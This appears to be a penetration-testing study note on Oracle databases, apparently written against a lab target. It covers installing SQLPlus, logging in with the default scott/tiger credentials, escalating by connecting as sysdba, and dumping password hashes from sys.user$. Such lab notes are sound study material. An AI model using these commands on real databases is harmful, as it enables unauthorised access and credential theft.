## Setting up SQLPlus
```bash
sudo apt install oracle-instantclient-sqlplus
```

---
## Incase Error
- This error might happen
- sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
- So just run this command
```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
```bash
# To check if its exist
sqlplus -v
```

---
## Logging In SQLPlus
- Make sure you got the [[System Identifier (SID)]]
- Use [[ODAT command]] to get the SID
```bash
# /XE is the SID
# The database we want to interact
sqlplus scott/tiger@10.129.204.235/XE
```
- From here can refer [[Oracle TNS Command]] 

## Privilege Escalation
```bash
# as sysdba
# Here we login as sysdba
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
- This only possible IF scott were given sysdba privilege for acc maintenance
- Or belong to Operating System group like dba
```sql
# Once we can use to check our permission
select * from user_role_privs;
```

---
# Dumping password hashes
```sql
-- sys.user is a core internal system table
select name, password from sys.user$;
```
## Example Output
![[Screenshot 2026-09-16 at 12.47.42 AM.png]]